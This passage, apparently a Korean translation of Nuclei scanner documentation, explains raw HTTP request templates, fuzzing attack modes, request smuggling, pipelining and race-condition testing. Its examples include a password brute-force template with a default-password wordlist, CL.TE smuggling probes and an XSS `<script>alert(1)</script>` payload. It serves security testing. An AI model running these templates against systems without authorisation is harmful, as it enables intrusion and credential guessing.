\ub2e4\uc74c\uacfc \uac19\uc740 DSL \ub3c4\uc6b0\ubbf8 \uae30\ub2a5\uc744 \ub354 \uc720\uc5f0\ud558\uac8c \uc9c0\uc6d0\ud558\uace0 \uc9c0\uc6d0\ud558\ub294 Raw \uc694\uccad\uc744 \uc0ac\uc6a9\ud558\ub294 \uac83\uc785\ub2c8\ub2e4(\ud604\uc7ac\ub85c\uc11c\ub294 {{Hostname}} ), \ubaa8\ub4e0 Matcher, Extractor \uae30\ub2a5\uc740 \uc704\uc5d0\uc11c \uc124\uba85\ud55c \uac83\uacfc \ub3d9\uc77c\ud55c \ubc29\uc2dd\uc73c\ub85c RAW \uc694\uccad\uacfc \ud568\uaed8 \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. http : - raw : - | POST /path2/ HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded a=test&b=pd \uc6d0\ud558\ub294 \ub300\ub85c \uc815\ud655\ud55c \uc791\uc5c5\uc744 \uc218\ud589\ud558\ub3c4\ub85d \uc694\uccad\uc744 \ubbf8\uc138 \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Nuclei \uc694\uccad\uc740 \uc644\uc804\ud788 \uad6c\uc131\ud560 \uc218 \uc788\uc74c\uc744 \uc758\ubbf8\ud569\ub2c8\ub2e4. \uc989, \ub300\uc0c1 \uc11c\ubc84\ub85c \ubcf4\ub0bc \uc694\uccad\uc5d0 \ub300\ud55c \ubaa8\ub4e0 \uac83\uc744 \uad6c\uc131\ud558\uace0 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. RAW \uc694\uccad \ud615\uc2dd\uc740 various helper functions \ub3c4 \uc9c0\uc6d0\ud558\ubbc0\ub85c \uc785\ub825\uc73c\ub85c \ub7f0\ud0c0\uc784 \uc870\uc791\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ud5e4\ub354\uc5d0 \ub3c4\uc6b0\ubbf8 \ud568\uc218\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608\uc785\ub2c8\ub2e4. raw : - | GET /manager/html HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('username:password')}} # Helper function to encode input at run time. \ucd94\uac00 \ubcc0\uc870 \uc5c6\uc774 \uc785\ub825\uc73c\ub85c \uc9c0\uc815\ub41c URL\uc5d0 \ub300\ud55c \uc694\uccad\uc744 \uc218\ud589\ud558\ub824\uba74 \uc544\ub798 \uc9c0\uc815\ub41c \ub300\ub85c \ube48 \uc694\uccad URI\ub97c \uc0ac\uc6a9\ud558\uc5ec \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uc785\ub825\uc5d0 \ub300\ud55c \uc694\uccad\uc744 \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. raw : - | GET HTTP/1.1 Host: {{Hostname}} HTTP Fuzzing \u00b6 Info Nuclei engine supports fuzzing module that allow to run various type of payloads in multiple format, It's possible to define placeholders with simple keywords (or using brackets {{helper_function(variable)}} in case mutator functions are needed), and perform batteringram , pitchfork and clusterbomb attacks. The wordlist for these attacks needs to be defined during the request definition under the Payload field, with a name matching the keyword, Nuclei supports both file based and in template wordlist support and Finally all DSL functionalities are fully available and supported, and can be used to manipulate the final values. \ud398\uc774\ub85c\ub4dc\ub294 \ubcc0\uc218 \uc774\ub984\uc744 \uc0ac\uc6a9\ud558\uc5ec \uc815\uc758\ub418\uba70 \u00a7 \u00a7 \ub610\ub294 {{ }} \ub9c8\ucee4 \uc0ac\uc774\uc5d0\uc11c \uc694\uccad\uc5d0\uc11c \ucc38\uc870\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ub85c\uceec \ub2e8\uc5b4 \ubaa9\ub85d\uacfc \ud568\uaed8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608: # HTTP Intruder fuzzing using local wordlist. payloads : paths : params.txt header : local.txt \ud15c\ud50c\ub9bf \ub2e8\uc5b4 \ubaa9\ub85d \uc9c0\uc6d0\uacfc \ud568\uaed8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc608: # HTTP Intruder fuzzing using in template wordlist. payloads : password : - admin - guest - password Note: \uc608\uae30\uce58 \uc54a\uc740 \uc785\ub825\uc774 \ud15c\ud50c\ub9bf\uc744 \uc190\uc0c1\uc2dc\ud0a4\ubbc0\ub85c \uacf5\uaca9 \uc720\ud615\uc744 \uc120\ud0dd\ud560 \ub54c \uc8fc\uc758\ud558\uc2ed\uc2dc\uc624. \uc608\ub97c \ub4e4\uc5b4 clusterbomb \ub610\ub294 pitchfork \ub97c \uacf5\uaca9 \uc720\ud615\uc73c\ub85c \uc0ac\uc6a9\ud558\uace0 \ud398\uc774\ub85c\ub4dc \uc139\uc158\uc5d0 \ud558\ub098\uc758 \ubcc0\uc218\ub9cc \uc815\uc758\ud55c \uacbd\uc6b0 clusterbomb \ub610\ub294 pitchfork \uac00 \ud15c\ud50c\ub9bf\uc5d0\uc11c \ub458 \uc774\uc0c1\uc758 \ubcc0\uc218\ub97c \uc0ac\uc6a9\ud560 \uac83\uc73c\ub85c \uc608\uc0c1\ud558\ubbc0\ub85c \ud15c\ud50c\ub9bf\uc740 \ucef4\ud30c\uc77c\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4. Attack mode \u00b6 Nuclei \uc5d4\uc9c4\uc740 \uc77c\ubc18\uc801\uc73c\ub85c \ub2e8\uc77c \ub9e4\uac1c\ubcc0\uc218\ub97c \ud37c\uc9d5\ud558\ub294 \ub370 \uc0ac\uc6a9\ub418\ub294 \uae30\ubcf8 \uc720\ud615\uc778 batteringram , \ud074\ub798\uc2dd burp \uce68\uc785\uc790\uc640 \ub3d9\uc77c\ud558\uac8c \uc791\ub3d9\ud558\ub294 \uc5ec\ub7ec \ub9e4\uac1c\ubcc0\uc218\ub97c \ud37c\uc9d5\ud558\ub294 clusterbomb \ubc0f pitchfork \ub97c \ud3ec\ud568\ud55c \uc5ec\ub7ec \uacf5\uaca9 \uc720\ud615\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. Type batteringram pitchfork clusterbomb Support batteringram batteringram \uacf5\uaca9 \uc720\ud615\uc740 \ubaa8\ub4e0 \uc704\uce58\uc5d0 \ub3d9\uc77c\ud55c \ud398\uc774\ub85c\ub4dc \uac12\uc744 \ubc30\uce58\ud569\ub2c8\ub2e4. \ud558\ub098\uc758 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub9cc \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud558\uace0 \ubaa8\ub4e0 \uc704\uce58\ub97c \ud398\uc774\ub85c\ub4dc \uac12\uc73c\ub85c \ubc14\uafc9\ub2c8\ub2e4. pitchfork pitchfork \uacf5\uaca9 \uc720\ud615\uc740 \uac01 \uc704\uce58\uc5d0 \ub300\ud574 \ud558\ub098\uc758 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \uc0ac\uc6a9\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uccab \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \ub450 \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. \uadf8\ub7f0 \ub2e4\uc74c \ub3d9\uc2dc\uc5d0 \ubaa8\ub4e0 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\uace0, \ub450 \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. clusterbomb \ud074\ub7ec\uc2a4\ud130 \ud3ed\ud0c4 \uacf5\uaca9\uc740 \ub2e4\uc591\ud55c \ud398\uc774\ub85c\ub4dc \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uc5ec\uc804\ud788 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uccab \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \ub450 \ubc88\uc9f8 \uc704\uce58\uc5d0 \ubc30\uce58\ud569\ub2c8\ub2e4. \uadf8\ub7ec\ub098 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud560 \ub54c \ubaa8\ub4e0 \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uadf8\ub7f0 \ub2e4\uc74c \ub3d9\uc2dc\uc5d0 \ubaa8\ub4e0 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\ub97c \ubc18\ubcf5\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\uace0, \ub450 \ubc88\uc9f8 \uc694\uccad\uc740 \uac01 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc758 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc\ub97c \uc0ac\uc6a9\ud558\ub294 \uc2dd\uc785\ub2c8\ub2e4. \uc774 \uacf5\uaca9 \uc720\ud615\uc740 \ubb34\ucc28\ubcc4 \ub300\uc785 \uacf5\uaca9\uc5d0 \uc720\uc6a9\ud569\ub2c8\ub2e4. \uccab \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc5d0\uc11c \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ub418\ub294 \uc0ac\uc6a9\uc790 \uc774\ub984 \ubaa9\ub85d\uc744 \ub85c\ub4dc\ud558\uace0 \ub450 \ubc88\uc9f8 \ud398\uc774\ub85c\ub4dc \uc138\ud2b8\uc5d0\uc11c \uc77c\ubc18\uc801\uc73c\ub85c \uc0ac\uc6a9\ub418\ub294 \ube44\ubc00\ubc88\ud638 \ubaa9\ub85d\uc744 \ub85c\ub4dc\ud569\ub2c8\ub2e4. \ud074\ub7ec\uc2a4\ud130 \ud3ed\ud0c4 \uacf5\uaca9\uc740 \ubaa8\ub4e0 \uc870\ud569\uc744 \uc2dc\ub3c4\ud569\ub2c8\ub2e4. \uc790\uc138\ud55c \ub0b4\uc6a9\uc740 here . fuzz\uc5d0 clusterbomb \uacf5\uaca9\uc744 \uc0ac\uc6a9\ud55c \uc608. http : - raw : - | POST /?file={{path}} HTTP/1.1 User-Agent: {{header}} Host: {{Hostname}} payloads : path : helpers/wordlists/prams.txt header : helpers/wordlists/header.txt attack : clusterbomb # Defining HTTP fuzz attack type Unsafe HTTP Requests \u00b6 Nuclei\ub294 HTTP reqeust smuggling, Host header injection, \uc798\ubabb\ub41c \ubb38\uc790\uac00 \ud3ec\ud568\ub41c CRLF \ub4f1\uacfc \uac19\uc740 \ubb38\uc81c\uc5d0 \ub300\ud574 **any kind of malformed requests**\uc744 \ud5c8\uc6a9\ud558\ub294 \uc644\uc804\ud55c \uc694\uccad \uc81c\uc5b4 \ubc0f \uc9c0\uc815\uc744 \uc704\ud55c rawhttp \ub97c \uc9c0\uc6d0\ud569\ub2c8\ub2e4. rawhttp \ub77c\uc774\ube0c\ub7ec\ub9ac\ub294 \uae30\ubcf8\uc801\uc73c\ub85c \ube44\ud65c\uc131\ud654\ub418\uc5b4 \uc788\uc73c\uba70 \uc694\uccad \ube14\ub85d\uc5d0 unsafe: true \ub97c \ud3ec\ud568\ud558\uc5ec \ud65c\uc131\ud654\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \ub2e4\uc74c\uc740 rawhttp \ub97c \uc0ac\uc6a9\ud55c HTTP \uc694\uccad \ubc00\uc218 \ud0d0\uc9c0 \ud15c\ud50c\ub9bf\uc758 \uc608\uc785\ub2c8\ub2e4. http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Content-Type: application/x-www-form-urlencoded Content-Length: 150 Transfer-Encoding: chunked 0 GET /post?postId=5 HTTP/1.1 User-Agent: a\"/><script>alert(1)</script> Content-Type: application/x-www-form-urlencoded Content-Length: 5 x=1 - |+ GET /post?postId=5 HTTP/1.1 Host: {{Hostname}} unsafe : true # Enables rawhttp client matchers : - type : dsl dsl : - 'contains(body, \"<script>alert(1)</script>\")' Advance Fuzzing \u00b6 \uc6b0\ub9ac\ub294 \uc6f9 \uc11c\ubc84\uc758 \uace0\uae09 \ud37c\uc9d5\uc744 \ud5c8\uc6a9\ud558\uae30 \uc704\ud574 nuclei\uc744 \uac15\ud654\ud588\uc2b5\ub2c8\ub2e4. \uc774\uc81c \uc0ac\uc6a9\uc790\ub294 \uc5ec\ub7ec \uc635\uc158\uc744 \uc0ac\uc6a9\ud558\uc5ec HTTP \ud37c\uc9d5 \uc6cc\ud06c\ud50c\ub85c\ub97c \uc870\uc815\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Pipelining \u00b6 HTTP \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uc9c0\uc6d0\uc774 \ucd94\uac00\ub418\uc5b4 \ub2e4\uc74c\uc5d0\uc11c \uc601\uac10\uc744 \ubc1b\uc740 \ub3d9\uc77c\ud55c \uc5f0\uacb0\uc5d0\uc11c \uc5ec\ub7ec HTTP \uc694\uccad\uc744 \ubcf4\ub0bc \uc218 \uc788\uc2b5\ub2c8\ub2e4. http-desync-attacks-request-smuggling-reborn . HTTP \ud30c\uc774\ud504\ub77c\uc778 \uae30\ubc18 \ud15c\ud50c\ub9bf\uc744 \uc2e4\ud589\ud558\uae30 \uc804\uc5d0 \uc2e4\ud589 \uc911\uc778 \ub300\uc0c1\uc774 HTTP \ud30c\uc774\ud504\ub77c\uc778 \uc5f0\uacb0\uc744 \uc9c0\uc6d0\ud558\ub294\uc9c0 \ud655\uc778\ud558\uc2ed\uc2dc\uc624. \uadf8\ub807\uc9c0 \uc54a\uc73c\uba74 \ud575 \uc5d4\uc9c4\uc774 \ud45c\uc900 HTTP \uc694\uccad \uc5d4\uc9c4\uc73c\ub85c \ud3f4\ubc31\ud569\ub2c8\ub2e4. \uc8fc\uc5b4\uc9c4 \ub3c4\uba54\uc778 \ub610\ub294 \ud558\uc704 \ub3c4\uba54\uc778 \ubaa9\ub85d\uc774 HTTP \ud30c\uc774\ud504\ub77c\uc774\ub2dd\uc744 \uc9c0\uc6d0\ud558\ub294\uc9c0 \ud655\uc778\ud558\ub824\uba74 httpx \uc5d0 -pipeline \ud50c\ub798\uadf8\uac00 \uc788\uc2b5\ub2c8\ub2e4. nuclei\uc758 \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uc18d\uc131\uc744 \ud45c\uc2dc\ud558\ub294 \uad6c\uc131\uc758 \uc608\uc785\ub2c8\ub2e4. unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 nuclei\uc758 \ud30c\uc774\ud504\ub77c\uc774\ub2dd \uae30\ub2a5\uc744 \ubcf4\uc5ec\uc8fc\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc774 \uc544\ub798\uc5d0 \uc81c\uacf5\ub418\uc5c8\uc2b5\ub2c8\ub2e4. id : pipeline-testing info : name : pipeline testing author : pdteam severity : info http : - raw : - |+ GET /{{path}} HTTP/1.1 Host: {{Hostname}} Referer: {{BaseURL}} attack : batteringram payloads : path : path_wordlist.txt unsafe : true pipeline : true pipeline-concurrent-connections : 40 pipeline-requests-per-connection : 25000 matchers : - type : status part : header status : - 200 Connection pooling \u00b6 \uc774\uc804 \ubc84\uc804\uc758 nuclei\ub294 \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc218\ud589\ud558\uc9c0 \uc54a\uc558\uc9c0\ub9cc \uc774\uc81c \uc0ac\uc6a9\uc790\ub294 HTTP \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc0ac\uc6a9\ud558\uac70\ub098 \uc0ac\uc6a9\ud558\uc9c0 \uc54a\ub3c4\ub85d \ud15c\ud50c\ub9bf\uc744 \uad6c\uc131\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. \uc774\ub97c \ud1b5\ud574 \uc694\uad6c \uc0ac\ud56d\uc5d0 \ub530\ub77c \ub354 \ube60\ub978 \uc2a4\uce94\uc774 \uac00\ub2a5\ud569\ub2c8\ub2e4. \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc5f0\uacb0 \ud480\ub9c1\uc744 \ud65c\uc131\ud654\ud558\ub824\uba74 \ud398\uc774\ub85c\ub4dc \uc139\uc158\uc5d0\uc11c \uc0ac\uc6a9\ud558\ub824\ub294 \uac01 \uc2a4\ub808\ub4dc \uc218\ub85c threads \uc18d\uc131\uc744 \uc815\uc758\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. Connection: Close \ud5e4\ub354\ub294 HTTP \uc5f0\uacb0 \ud480\ub9c1 \ud15c\ud50c\ub9bf\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc5c6\uc2b5\ub2c8\ub2e4. \uadf8\ub807\uc9c0 \uc54a\uc73c\uba74 \uc5d4\uc9c4\uc774 \uc2e4\ud328\ud558\uace0 \ud480\ub9c1\uc774 \uc788\ub294 \ud45c\uc900 HTTP \uc694\uccad\uc73c\ub85c \ub300\uccb4\ub429\ub2c8\ub2e4. HTTP \uc5f0\uacb0 \ud480\ub9c1\uc744 \uc0ac\uc6a9\ud558\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf- id : fuzzing-example info : name : Connection pooling example author : pdteam severity : info http : - raw : - | GET /protected HTTP/1.1 Host: {{Hostname}} Authorization: Basic {{base64('admin:\u00a7password\u00a7')}} attack : batteringram payloads : password : password.txt threads : 40 matchers-condition : and matchers : - type : status status : - 200 - type : word words : - \"Unique string\" part : body Smuggling \u00b6 HTTP Smuggling\uc740 \ucd5c\uadfc Portswigger's Research \uc5d0\uc11c \ud654\uc81c\uac00 \ub41c \uc6f9 \uacf5\uaca9 \ud074\ub798\uc2a4\uc785\ub2c8\ub2e4. \uc790\uc138\ud55c \uac1c\uc694\ub294 \uc704\uc5d0 \ub9c1\ud06c\ub41c \uae30\uc0ac\ub97c \ucc38\uc870\ud558\uc2ed\uc2dc\uc624. \uc624\ud508 \uc18c\uc2a4 \uacf5\uac04\uc5d0\uc11c http \ubc00\uc218 \ud0d0\uc9c0\ub294 \ud2b9\ud788 \ud0d0\uc9c0 \uc694\uccad\uc758 \ud2b9\uc131\uc0c1 \uae30\ud615\uc801\uc774\uae30 \ub54c\ubb38\uc5d0 \ud0d0\uc9c0\uac00 \uc5b4\ub835\uc2b5\ub2c8\ub2e4. Nuclei\ub294 rawhttp \uc5d4\uc9c4\uc744 \ud65c\uc6a9\ud558\uc5ec HTTP Smuggling \ucde8\uc57d\uc810\uc744 \uc548\uc815\uc801\uc73c\ub85c \ud0d0\uc9c0\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. HTTP Smuggling \ucde8\uc57d\uc810\uc758 \uac00\uc7a5 \uae30\ubcf8\uc801\uc778 \uc608\ub294 CL.TE Smuggling\uc785\ub2c8\ub2e4. rawhttp \uae30\ubc18 \uc694\uccad\uc5d0 \ub300\ud574 unsafe: true \uc18d\uc131\uc744 \uc0ac\uc6a9\ud558\uc5ec CE.TL HTTP Smuggling \ucde8\uc57d\uc810\uc744 \uac10\uc9c0\ud558\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc774 \uc544\ub798\uc5d0 \uc81c\uacf5\ub429\ub2c8\ub2e4. id : CL-TE-http-smuggling info : name : HTTP request smuggling, basic CL.TE vulnerability author : pdteam severity : info reference : https://portswigger.net/web-security/request-smuggling/lab-basic-cl-te http : - raw : - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G - |+ POST / HTTP/1.1 Host: {{Hostname}} Connection: keep-alive Content-Type: application/x-www-form-urlencoded Content-Length: 6 Transfer-Encoding: chunked 0 G unsafe : true matchers : - type : word words : - 'Unrecognized method GPOST' \ub354 \ub9ce\uc740 \uc608\uc81c\ub294 \ub2e4\uc74c\uc5d0\uc11c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. template-examples section for smuggling templates. Race conditions \u00b6 \uacbd\uc7c1 \uc870\uac74\uc740 \uae30\uc874 \ub3c4\uad6c\ub97c \ud1b5\ud574 \uc27d\uac8c \uc790\ub3d9\ud654\ub418\uc9c0 \uc54a\ub294 \ub610 \ub2e4\ub978 \uc720\ud615\uc758 \ubc84\uadf8\uc785\ub2c8\ub2e4. Burp Suite\ub294 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \ub300\ud55c \ubaa8\ub4e0 \ubc14\uc774\ud2b8\uac00 \uc804\uc1a1 \uc774\ubca4\ud2b8\ub97c \ub3d9\uae30\ud654\ud558\ub294 \ubaa8\ub4e0 \uc694\uccad\uc5d0 \ub300\ud574 \ud568\uaed8 \uc804\uc1a1\ub418\ub294 \ud55c \ubc88\uc5d0 \ub9c8\uc9c0\ub9c9 \ubc14\uc774\ud2b8\ub97c \uc608\uc0c1\ud558\ub294 Turbo Intruder\uc5d0 \uac8c\uc774\ud2b8 \uba54\ucee4\ub2c8\uc998\uc744 \ub3c4\uc785\ud588\uc2b5\ub2c8\ub2e4. \uc6b0\ub9ac\ub294 Nuclei \uc5d4\uc9c4\uc5d0 Gate \uba54\ucee4\ub2c8\uc998\uc744 \uad6c\ud604\ud588\uc73c\uba70 \ud15c\ud50c\ub9bf\uc744 \ud1b5\ud574 \uc2e4\ud589\ud560 \uc218 \uc788\ub3c4\ub85d \ud558\uc5ec \uc774 \ud2b9\uc815 \ubc84\uadf8 \ud074\ub798\uc2a4\uc5d0 \ub300\ud55c \ud14c\uc2a4\ud2b8\ub97c \uac04\ub2e8\ud558\uace0 \uc774\uc2dd \uac00\ub2a5\ud558\uac8c \ub9cc\ub4ed\ub2c8\ub2e4. \ud15c\ud50c\ub9bf \ub0b4\uc5d0\uc11c \uacbd\uc7c1 \uc870\uac74 \ud655\uc778\uc744 \ud65c\uc131\ud654\ud558\ub824\uba74 race \uc18d\uc131\uc744 true \ub85c \uc124\uc815\ud558\uace0 race_count \ub294 \uc2dc\uc791\ud558\ub824\ub294 \ub3d9\uc2dc \uc694\uccad \uc218\ub97c \uc815\uc758\ud569\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uac8c\uc774\ud2b8 \ub85c\uc9c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc77c\ud55c \uc694\uccad\uc774 10\ubc88 \ubc18\ubcf5\ub418\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : race-condition-testing info : name : Race condition testing author : pdteam severity : info http : - raw : - | POST /coupons HTTP/1.1 Host: {{Hostname}} promo_code=20OFF race : true race_count : 10 matchers : - type : status part : header status : - 200 POST \uc694\uccad\uc744 \ucde8\uc57d\ud55c \uac83\uc73c\ub85c \uc758\uc2ec\ub418\ub294 \uc694\uccad\uc73c\ub85c \uad50\uccb4\ud558\uace0 \ud544\uc694\uc5d0 \ub530\ub77c race_count \ub97c \ubcc0\uacbd\ud558\uba74 \uc2e4\ud589\ud560 \uc900\ube44\uac00 \ub429\ub2c8\ub2e4. nuclei -t race.yaml -target https://api.target.com Multi request race condition testing \uacbd\uc7c1 \uc870\uac74\uc744 \uc774\uc6a9\ud558\uae30 \uc704\ud574 \uc5ec\ub7ec \uc694\uccad\uc744 \ubcf4\ub0b4\uc57c \ud558\ub294 \uc2dc\ub098\ub9ac\uc624\uc758 \uacbd\uc6b0 \uc2a4\ub808\ub4dc\ub97c \uc0ac\uc6a9\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. threads : 5 race : true threads \ub294 \uacbd\uc7c1 \uc870\uac74 \ud14c\uc2a4\ud2b8\ub97c \uc218\ud589\ud558\uae30 \uc704\ud574 \ud15c\ud50c\ub9bf\uc73c\ub85c \ub9cc\ub4e4\uace0\uc790 \ud558\ub294 \ucd1d \uc694\uccad \uc218\uc785\ub2c8\ub2e4. \ub2e4\uc74c\uc740 \uac8c\uc774\ud2b8 \ub85c\uc9c1\uc744 \uc0ac\uc6a9\ud558\uc5ec \ub3d9\uc2dc\uc5d0 \uc5ec\ub7ec(5) \uac1c\uc758 \uace0\uc720 \uc694\uccad\uc774 \uc804\uc1a1\ub418\ub294 \uc608\uc81c \ud15c\ud50c\ub9bf\uc785\ub2c8\ub2e4. id : multi-request-race info : name : Race condition testing with multiple requests author : pd-team severity : info http : - raw : - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=1 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=2 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=3 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=4 - | POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 id=5 threads : 5 race : true Requests Annotation \uc694\uccad \uc778\ub77c\uc778 \uc8fc\uc11d\uc740 \uc694\uccad \uc18d\uc131/\ub3d9\uc791 \uc7ac\uc815\uc758\uc5d0 \ub530\ub77c \uc218\ud589\ud560 \uc218 \uc788\uc2b5\ub2c8\ub2e4. python/java \ud074\ub798\uc2a4 \uc8fc\uc11d\uacfc \ub9e4\uc6b0 \uc720\uc0ac\ud558\uba70 RFC \ub77c\uc778 \ubc14\ub85c \uc55e\uc5d0 \uc694\uccad\uc5d0 \ub123\uc5b4\uc57c \ud569\ub2c8\ub2e4. \ud604\uc7ac \ub2e4\uc74c \uc7ac\uc815\uc758\ub9cc \uc9c0\uc6d0\ub429\ub2c8\ub2e4.: @Host: \uc694\uccad\uc758 \uc2e4\uc81c \ub300\uc0c1\uc744 \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4(\uc77c\ubc18\uc801\uc73c\ub85c \uc785\ub825\uc73c\ub85c \uc81c\uacf5\ub418\ub294 host/ip). ip/domain, port \ubc0f schema\uac00 \uc788\ub294 \uad6c\ubb38\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4(\uc608: domain.tld , domain.tld:port , http://domain.tld:port ). @tls-sni: \uc774\ub294 TLS \uc694\uccad\uc758 SNI \uc774\ub984(\uc77c\ubc18\uc801\uc73c\ub85c \uc785\ub825\uc73c\ub85c \uc81c\uacf5\ub41c \ud638\uc2a4\ud2b8 \uc774\ub984)\uc744 \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. \ubaa8\ub4e0 \ub9ac\ud130\ub7f4\uc744 \uc9c0\uc6d0\ud558\uba70 \ud2b9\uc218 \uac12 request.host \ub294 Host \ud5e4\ub354 \uac12\uc744 \uc0ac\uc6a9\ud569\ub2c8\ub2e4. @timeout: \uc0ac\uc6a9\uc790 \uc9c0\uc815 \uae30\uac04\uc5d0 \ub300\ud55c \uc694\uccad\uc758 \uc2dc\uac04 \ucd08\uacfc\ub97c \uc7ac\uc815\uc758\ud569\ub2c8\ub2e4. \ubb38\uc790\uc5f4 \ud615\uc2dd\uc758 \uae30\uac04\uc744 \uc9c0\uc6d0\ud569\ub2c8\ub2e4. \uae30\uac04\uc744 \uc9c0\uc815\ud558\uc9c0 \uc54a\uc73c\uba74 \uae30\ubcf8 \uc2dc\uac04 \ucd08\uacfc \ud50c\ub798\uadf8 \uac12\uc774 \uc0ac\uc6a9\ub429\ub2c8\ub2e4. \ub2e4\uc74c \uc608\ub294 \uc694\uccad \ub0b4\uc758 \uc8fc\uc11d\uc744 \ubcf4\uc5ec\uc90d\ub2c8\ub2e4. - | @Host: https://projectdiscovery.io:443 POST / HTTP/1.1 Pragma: no-cache Host: {{Hostname}} Cache-Control: no-cache, no-transform User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0 \uc774\uac83\uc740 \uc608\ub97c \ub4e4\uc5b4 \uc5ec\ub7ec \uc694\uccad\uc774 \uc788\ub294 \ud15c\ud50c\ub9bf\uc758 \uacbd\uc6b0\uc5d0 